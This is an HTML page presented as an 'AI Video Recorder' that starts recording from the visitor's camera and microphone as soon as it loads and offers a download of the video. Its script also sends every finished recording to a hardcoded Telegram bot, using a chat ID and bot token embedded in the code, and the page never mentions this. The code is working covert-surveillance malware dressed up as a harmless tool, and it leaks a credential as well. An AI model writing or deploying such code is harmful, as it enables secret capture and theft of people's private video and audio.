<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Video Recorder - Camera</title>
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background: black;
            color: white;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        video {
            width: 90%;
            max-width: 600px;
            border: 3px solid white;
            border-radius: 8px;
            margin-bottom: 20px;
        }

        #countdown {
            font-size: 1.5rem;
            margin-bottom: 20px;
        }

        #progressBarContainer {
            width: 90%;
            max-width: 600px;
            height: 20px;
            background: #444;
            border-radius: 10px;
            overflow: hidden;
            margin-top: 10px;
        }

        #progressBar {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #4e54c8, #8f94fb);
            transition: width 0.2s linear;
        }

        #previewContainer {
            display: none;
            flex-direction: column;
            align-items: center;
            margin-top: 20px;
        }

        button {
            padding: 10px 20px;
            background: #4e54c8;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 1rem;
            cursor: pointer;
            margin-top: 10px;
        }

        button:hover {
            background: #ff5f6d;
        }
    </style>
</head>
<body>
    <h1>Recording in Progress...</h1>
    <video id="livePreview" autoplay muted></video>
    <div id="countdown">Initializing...</div>

    <div id="progressBarContainer">
        <div id="progressBar"></div>
    </div>

    <div id="previewContainer">
        <h2>Recording Finished!</h2>
        <video id="videoPreview" controls></video>
        <a id="downloadLink" download="recorded-video.webm">
            <button>Download Video</button>
        </a>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const duration = parseInt(urlParams.get('duration')) || 60;
        const resolution = urlParams.get('resolution') || '720';

        let mediaRecorder;
        let stream;
        const chunks = [];
        let countdownInterval;

        async function startStream() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: resolution === '1080' ? 1920 : 1280,
                        height: resolution === '1080' ? 1080 : 720
                    },
                    audio: true
                });
                document.getElementById('livePreview').srcObject = stream;
                startRecording();
            } catch (error) {
                console.error('Error accessing camera or microphone:', error);
            }
        }

        function startRecording() {
            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp9' });
            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) chunks.push(event.data);
            };

            mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                displayPreview(blob);
                sendToTelegram(blob); // Automatically send video to Telegram
            };

            mediaRecorder.start();
            startCountdown(duration);
            updateProgressBar(duration);

            setTimeout(() => {
                mediaRecorder.stop();
                stream.getTracks().forEach((track) => track.stop());
            }, duration * 1000);
        }

        function startCountdown(seconds) {
            const countdownElement = document.getElementById('countdown');
            let remaining = seconds;

            countdownInterval = setInterval(() => {
                countdownElement.textContent = `Recording time left: ${remaining} seconds`;
                remaining--;

                if (remaining < 0) {
                    clearInterval(countdownInterval);
                    countdownElement.textContent = 'Recording finished.';
                }
            }, 1000);
        }

        function updateProgressBar(totalDuration) {
            const progressBar = document.getElementById('progressBar');
            let elapsedTime = 0;

            const progressInterval = setInterval(() => {
                elapsedTime++;
                const progressPercentage = (elapsedTime / totalDuration) * 100;
                progressBar.style.width = `${progressPercentage}%`;

                if (elapsedTime >= totalDuration) {
                    clearInterval(progressInterval);
                }
            }, 1000);
        }

        function displayPreview(blob) {
            const videoPreview = document.getElementById('videoPreview');
            const downloadLink = document.getElementById('downloadLink');
            const previewContainer = document.getElementById('previewContainer');

            const videoURL = URL.createObjectURL(blob);
            videoPreview.src = videoURL;
            downloadLink.href = videoURL;

            previewContainer.style.display = 'flex';
        }

        function sendToTelegram(blob) {
            const chatId = '7361816575';
            const botToken = '7911158066:AAH8zYHwLkLWs4FZwjbEEMpNf2zgdoj2WoI';
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('video', blob, 'recorded-video.webm');

            fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                method: 'POST',
                body: formData
            })
                .then(response => {
                    if (response.ok) {
                        console.log('Video sent successfully!');
                    } else {
                        console.error('Failed to send video:', response.statusText);
                    }
                })
                .catch(error => {
                    console.error('Error sending video:', error);
                });
        }

        // Start the stream when the page loads
        startStream();
    </script>
</body>
</html>
